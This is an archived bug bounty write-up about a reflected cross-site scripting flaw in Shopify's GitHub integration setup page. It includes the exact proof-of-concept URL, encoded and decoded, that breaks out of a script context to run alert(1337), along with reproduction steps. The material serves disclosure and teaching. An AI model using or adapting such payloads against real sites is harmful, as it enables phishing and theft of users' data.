---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-20_reflected-cross-site-scripting-awards-3500-bounty.md
original_filename: 2023-02-20_reflected-cross-site-scripting-awards-3500-bounty.md
title: Reflected Cross Site Scripting (Awards 3500$ bounty)
category: documents
detected_topics:
- xss
- command-injection
- otp
tags:
- imported
- documents
- xss
- command-injection
- otp
language: en
raw_sha256: 9976ab5223dfbf1cf590c1ac12860c65b10ebc85acb742f8db5c2a1e4f9aed2f
text_sha256: 457d6feea4aad178002661db445e2927c3dadf83f81b5a74a4a209349fa2018d
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: true
---

# Reflected Cross Site Scripting (Awards 3500$ bounty)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-20_reflected-cross-site-scripting-awards-3500-bounty.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: True
- Raw SHA256: `9976ab5223dfbf1cf590c1ac12860c65b10ebc85acb742f8db5c2a1e4f9aed2f`
- Text SHA256: `457d6feea4aad178002661db445e2927c3dadf83f81b5a74a4a209349fa2018d`


## Content

---
title: "Reflected Cross Site Scripting (Awards 3500$ bounty)"
url: "https://jjainam16.medium.com/reflected-cross-site-scripting-awards-3500-bounty-c8a619f129a1"
authors: ["ShuttlerTech"]
programs: ["Shopify"]
bugs: ["Reflected XSS"]
bounty: "3,500"
publication_date: "2023-02-20"
added_date: "2023-02-26"
source: "pentester.land/writeups.json"
original_index: 1509
scraped_via: "browseros"
---

# Reflected Cross Site Scripting (Awards 3500$ bounty)

Reflected Cross Site Scripting (Awards 3500$ bounty)
ShuttlerTech
Follow
2 min read
·
Feb 20, 2023

71

3

Press enter or click to view image in full size

Hello, Hunters. You are here because you are struggling or want to advance in your career. Believe me, things take time. Be consistent, continue to learn, and never deceive yourself. If you follow this three mantras, you will undoubtedly achieve success.

For better Career Opportunity Connect with me 1:1 click on 👉🏻(TOPMATE)

Without wasting time let ‘s Start:

The “Shopify Github Integration” tool makes it easier to link a GitHub account to a Shopify store. A vulnerable URL, https://online-store-git.shopifycloud.com, is used during the Github connection process.

Shops Used to Test : devpresent.myshopify.com

Relevant Request IDs: x-request-id: ***REDACTED-SUSPECT-TOKEN***Steps To Reproduce:
Visit the next URL https://online-store-git.shopifycloud.com/github/setup?installation_id=20913869%7d%7d%7d%29%3b%7d%3balert%281337%29%3bif%281==2%29%7bk=new%20Promise%28function%28%29%7bif%281==2%29%7bv=%7be:%201&setup_action=install
After Decoding Above url : “https://online-store-git.shopifycloud.com/github/setup?installation_id=20913869}}});};alert(1337);if(1==2){k=new Promise(function(){if(1==2){v={e: 1&setup_action=install”

Payload used (alert(1337))

Get ShuttlerTech’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

3. Enter an owner or staff credentials.

4. The XSS will fire.

Press enter or click to view image in full size
Impact

There are several impacts.

The attacker could use Javascript in order to do phishing attacks.
Steal data.
Reflected JS

Thank you for reading !! hope you get to learn some tricks.

Subscribe to the Shuttlertech YouTube channel for more of this type of content and to watch live POCs & To advance your career connect with me 1:1 over topmate .
To encourage me to write more, follow me on medium and click the clap icon.
